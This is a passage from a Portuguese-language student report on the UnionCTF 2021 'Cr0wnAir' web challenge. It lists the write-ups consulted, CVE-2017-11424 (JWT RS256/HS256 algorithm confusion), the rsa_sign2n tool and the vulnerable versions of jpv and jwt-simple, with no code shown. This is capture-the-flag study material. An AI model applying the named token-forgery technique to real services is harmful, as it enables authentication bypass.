`jwt-simple` como as bibliotecas reais do desafio original.
Interpretamos isso como uma possível inconsistência na planilha
(talvez texto de outro desafio) e seguimos com as bibliotecas
confirmadas pelas fontes públicas. Ficamos à disposição para ajustar
caso o professor confirme que `fast-json-stringify`/`jsonwebtoken`
eram de fato esperadas.

---

## 13. Referências

- Código-fonte e mecânica do desafio: write-up de **ret2school**,
  *"[UnionCTF 2021 — web] Cr0wnAir"* — inclui o código-fonte
  reproduzido de `routes/checkin.js` e `routes/upgrades.js`.
- Técnica de recuperação de `N` via GCD: write-up de
  **Kalmarunionen** (Nicolai Søborg), *"Union CTF 2021: Cr0wnAir"* —
  inclui a implementação de referência em Python com `gmpy2`.
- Write-up adicional consultado: **STT/sectt** (IST), *"cr0wnair —
  Union CTF 2021"*.
- Write-up adicional consultado: **qxxxb/ARESx**, *"Cr0wnAir"*
  (CTFtime) — confirma independentemente as versões `jpv@2.0.1` e
  `jwt-simple@0.5.2`.
- Vulnerabilidade catalogada: **CVE-2017-11424** (confusão de
  algoritmo RS256/HS256 em bibliotecas JWT).
- Ferramenta pública de referência (não usada como dependência):
  **`rsa_sign2n`**, Silent Signal — *"Abusing JWT Public Keys
  Without the Public Key"*.
- Biblioteca vulnerável: **`jpv`** (versões testadas: 1.5.1 a 3.1.2;
  bypass confirmado até a 2.0.1, corrigido a partir da 2.1.0).
- Biblioteca vulnerável: **`jwt-simple`** versão 0.5.1.

---

## 14. Link da apresentação
